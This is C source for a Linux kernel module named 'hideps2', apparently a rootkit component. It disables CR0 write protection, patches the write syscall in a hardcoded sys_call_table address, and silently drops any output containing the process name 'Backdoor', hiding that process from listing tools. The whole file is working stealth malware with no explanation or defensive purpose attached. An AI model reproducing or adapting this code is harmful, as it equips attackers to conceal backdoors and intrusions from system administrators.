#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#define CALLOFF 100


int orig_cr0;
char psname[10]="Backdoor";
char *processname=psname;


void** sys_call_table;

void disable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
}

void enable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        set_bit(16, &cr0);
        write_cr0(cr0);
}



asmlinkage long (*orig_write)(unsigned int fd,
		char *buf, unsigned int count);


asmlinkage long hacked_write(unsigned int fd,
		char * buf, unsigned int count)
{
	char *k_buf;
	k_buf = (char*)kmalloc(256,GFP_KERNEL);
	memset(k_buf,0,256);
	copy_from_user(k_buf,buf,255);
	if(strstr(k_buf,processname))
	{
		kfree(k_buf);
		return count;
	}
	kfree(k_buf);
	//printk(KERN_INFO "finished hacked_write.\n");
	return orig_write(fd,buf,count);
}

static int filter_init(void)
{
	sys_call_table = (void *)0xc15c3060;
	orig_write = sys_call_table[__NR_write];
	printk("offset: 0x%x\n\n\n\n",orig_write);
        disable_write_protection();
	sys_call_table[__NR_write] = hacked_write;
	enable_write_protection();
	printk(KERN_INFO "hideps2: module loaded.\n");
	return 0;
}


static void filter_exit(void)
{
        disable_write_protection();
	if (sys_call_table)
		sys_call_table[__NR_write] = orig_write;
	enable_write_protection();

	printk(KERN_INFO "hideps2: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
